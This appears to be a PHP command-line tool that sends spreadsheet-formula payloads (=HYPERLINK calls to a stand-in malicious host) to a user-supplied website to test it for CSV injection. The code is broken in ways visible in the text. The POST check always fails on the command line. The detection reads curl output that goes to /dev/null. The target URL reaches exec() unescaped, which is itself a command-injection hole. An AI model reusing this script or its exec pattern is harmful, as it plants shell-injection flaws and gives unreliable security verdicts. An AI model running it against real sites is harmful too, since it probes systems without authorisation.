<?php

// Function to colorize output
function colorize($string, $color) {
    $colors = [
        'red'    => "\033[0;31m",
        'green'  => "\033[0;32m",
        'yellow' => "\033[0;33m",
        'blue'   => "\033[0;34m",
        'reset'  => "\033[0m"
    ];

    return $colors[$color] . $string . $colors['reset'];
}

// Function to check if POST requests are enabled
function isPostEnabled() {
    $content = file_get_contents("php://input");
    return ($content !== false && !empty($content));
}

// Function to test CSV Injection vulnerability
function testCSVInjection($url) {
    // Constructing payload
    $payload1 = "=HYPERLINK(\"http://malicious-site.com\")";
    $payload2 = "=\nHYPERLINK(\"http://malicious-site.com\")";
    $payload3 = "=\r\nHYPERLINK(\"http://malicious-site.com\")";
    
    // Sending requests with different payloads
    $csvData1 = "\"Name\",\"Email\"\n";
    $csvData1 .= "John Doe,$payload1\n";

    $csvData2 = "\"Name\",\"Email\"\n";
    $csvData2 .= "John Doe,$payload2\n";

    $csvData3 = "\"Name\",\"Email\"\n";
    $csvData3 .= "John Doe,$payload3\n";

    $isVulnerable = false;

    foreach ([$csvData1, $csvData2, $csvData3] as $csvData) {
        // Saving the payload to a temporary CSV file
        $tempFile = tempnam(sys_get_temp_dir(), 'csv');
        file_put_contents($tempFile, $csvData);

        // Executing command to download the CSV file
        exec("curl -o /dev/null -s '$url' --data-binary @$tempFile", $output, $return);

        // Removing the temporary CSV file
        unlink($tempFile);

        // Checking if the payload was executed
        if (strpos(implode("\n", $output), "malicious-site.com") !== false) {
            $isVulnerable = true;
            break;
        }
    }

    return $isVulnerable;
}

// Clearing terminal
echo "\033[2J\033[;H";

// Checking if POST requests are enabled
echo colorize("Checking if POST requests are enabled...\n", 'yellow');
if (!isPostEnabled()) {
    echo colorize("POST Requests Enabled: No\n", 'red');
    echo colorize("CSV Injection vulnerability cannot be tested because POST requests are not enabled.\n", 'red');
    exit;
} else {
    echo colorize("POST Requests Enabled: Yes\n", 'green');
}

// Prompting for target website URL
echo colorize("\nEnter your target website URL: ", 'blue');
$targetURL = trim(fgets(STDIN));

// Testing CSV Injection vulnerability
echo colorize("\nTesting for CSV Injection vulnerability...\n", 'yellow');
$isVulnerable = testCSVInjection($targetURL);

// Displaying results
if ($isVulnerable) {
    echo colorize("The target website is vulnerable to CSV Injection!\n", 'red');
    echo colorize("To test the vulnerability, try different payloads and observe the behavior.\n", 'yellow');
} else {
    echo colorize("The target website is not vulnerable to CSV Injection.\n", 'green');
}
